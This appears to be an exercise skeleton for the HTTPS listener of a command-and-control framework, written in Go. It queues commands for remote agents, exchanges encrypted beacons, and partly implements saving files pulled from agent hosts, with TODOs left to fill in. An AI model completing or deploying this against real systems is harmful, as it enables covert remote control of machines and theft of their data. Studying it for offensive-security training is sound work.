package server

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/go-chi/chi/v5"

	"c2framework/internals/config"
	"c2framework/internals/control"
	"c2framework/internals/crypto"
	"c2framework/internals/models"
)

// DownloadDirectory is where downloaded files are saved
// TODO: add a constant DownloadDirectory to define where to save downloads to

// HTTPSServer implements the Server interface for HTTPS
type HTTPSServer struct {
	addr         string
	server       *http.Server
	tlsCert      string
	tlsKey       string
	sharedSecret string
}

// HTTPSResponse represents the JSON response for HTTPS
type HTTPSResponse struct {
	Change    bool            `json:"change"`
	Job       bool            `json:"job"`
	JobID     string          `json:"job_id,omitempty"`
	Command   string          `json:"command,omitempty"`
	Arguments json.RawMessage `json:"data,omitempty"`
}

// NewHTTPSServer creates a new HTTPS server
func NewHTTPSServer(cfg *config.ServerConfig) *HTTPSServer {
	return &HTTPSServer{
		addr:         fmt.Sprintf("%s:%s", cfg.ListeningInterface, cfg.ListeningPort),
		tlsCert:      cfg.TlsCert,
		tlsKey:       cfg.TlsKey,
		sharedSecret: cfg.SharedSecret,
	}
}

// Start implements Server.Start for HTTPS
func (s *HTTPSServer) Start() error {
	// Create Chi router
	r := chi.NewRouter()

	// Apply authentication middleware to agent routes
	r.With(AuthMiddleware(s.sharedSecret)).Post("/", RootHandler(s.sharedSecret))

	// Define POST endpoint for results
	r.Post("/results", ResultHandler)

	// Create the HTTP server
	s.server = &http.Server{
		Addr:    s.addr,
		Handler: r,
	}

	// Start the server
	return s.server.ListenAndServeTLS(s.tlsCert, s.tlsKey)
}

// Stop implements Server.Stop for HTTPS
func (s *HTTPSServer) Stop() error {
	// If there's no server, nothing to stop
	if s.server == nil {
		return nil
	}

	// Give the server 5 seconds to shut down gracefully
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	return s.server.Shutdown(ctx)
}

// RootHandler returns a handler that encrypts responses
func RootHandler(secret string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)

		// Read encrypted body
		encryptedBody, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading body", http.StatusBadRequest)
			return
		}

		log.Printf("Payload pre-decryption: %s", string(encryptedBody))

		// Decrypt the payload
		plaintext, err := crypto.Decrypt(string(encryptedBody), secret)
		if err != nil {
			log.Printf("Decryption failed: %v", err)
			http.Error(w, "Decryption failed", http.StatusBadRequest)
			return
		}

		log.Printf("Payload post-decryption: %s", string(plaintext))

		var response HTTPSResponse

		// FIRST, check if there are pending commands
		cmd, exists := control.AgentCommands.GetCommand()
		if exists {
			log.Printf("Sending command to agent: %s\n", cmd.Command)
			response.Job = true
			response.Command = cmd.Command
			response.Arguments = cmd.Arguments
			response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
			log.Printf("Job ID: %s\n", response.JobID)
		} else {
			log.Printf("No commands in queue")
		}

		// THEN, check if we should transition
		shouldChange := control.Manager.CheckAndReset()

		if shouldChange {
			response.Change = true
			log.Printf("HTTPS: Sending transition signal (change=true)")
		} else {
			log.Printf("HTTPS: Normal response (change=false)")
		}

		// Marshal response to JSON
		responseJSON, err := json.Marshal(response)
		if err != nil {
			log.Printf("Error marshaling response: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		// Encrypt the response
		encryptedResponse, err := crypto.Encrypt(responseJSON, secret)
		if err != nil {
			log.Printf("Error encrypting response: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		// Set content type to octet-stream for encrypted data
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write([]byte(encryptedResponse))
	}
}

// ResultHandler receives and displays the result from the Agent
func ResultHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)

	var result models.AgentTaskResult

	// Decode the incoming result
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		log.Printf("ERROR: Failed to decode JSON: %v", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode("error decoding JSON")
		return
	}

	// Try to detect if this is a download result
	if len(result.CommandResult) > 0 {
		var downloadResult models.DownloadResult
		if err := json.Unmarshal(result.CommandResult, &downloadResult); err == nil {
			// Check if it has file_data - that confirms it's a download result
			// TODO: Conditional to check if downloadResult.FileData is not empty, call handleDownloadResult()

		}
	}

	// Not a download result - handle as generic result
	var messageStr string
	if len(result.CommandResult) > 0 {
		if err := json.Unmarshal(result.CommandResult, &messageStr); err != nil {
			log.Printf("ERROR: Failed to unmarshal CommandResult: %v", err)
			messageStr = string(result.CommandResult) // Fallback to raw bytes as string
		}
	}

	if !result.Success {
		log.Printf("Job (ID: %s) has failed\nMessage: %s\nError: %v", result.JobID, messageStr, result.Error)
	} else {
		log.Printf("Job (ID: %s) has succeeded\nMessage: %s", result.JobID, messageStr)
	}
}

// handleDownloadResult processes and saves a download result
func handleDownloadResult(jobID string, downloadResult *models.DownloadResult) {
	if !downloadResult.Success {
		log.Printf("Job (ID: %s) DOWNLOAD FAILED: %s", jobID, downloadResult.ErrorMsg)
		return
	}

	// So if we get here assume download succeeded
	// Decode the base64 file data
	// TODO: decode downloadResult.FileData using base64.StdEncoding.DecodeString(), return value is fileData
	if err != nil {
		log.Printf("Job (ID: %s) ERROR: Failed to decode base64 file data: %v", jobID, err)
		return
	}

	// Create downloads directory if it doesn't exist
	// TODO create DownloadDirectory if it does not exist
	err := os.MkdirAll(DownloadDirectory, 0755)
	if err != nil {
		log.Printf("Job (ID: %s) ERROR: Failed to create downloads directory: %v", jobID, err)
		return
	}

	// Extract just the filename from the path (handles both Windows and Unix paths)
	// TODO: use filepath.Base() to extract filename from full path

	// Prefix with job ID to avoid collisions
	// TODO: create savedFilename, prepend jobID to filename
	// TODO: user filepath.Join() to create full path to save to

	// Write the file
	// TODO: call os.WriteFile() with args savedPath, fileData, 0644
	if err != nil {
		log.Printf("Job (ID: %s) ERROR: Failed to save file: %v", jobID, err)
		return
	}

	log.Printf("Job (ID: %s) DOWNLOAD SUCCESS: Saved %d bytes to %s (original: %s)",
		jobID, len(fileData), savedPath, downloadResult.FilePath)
}
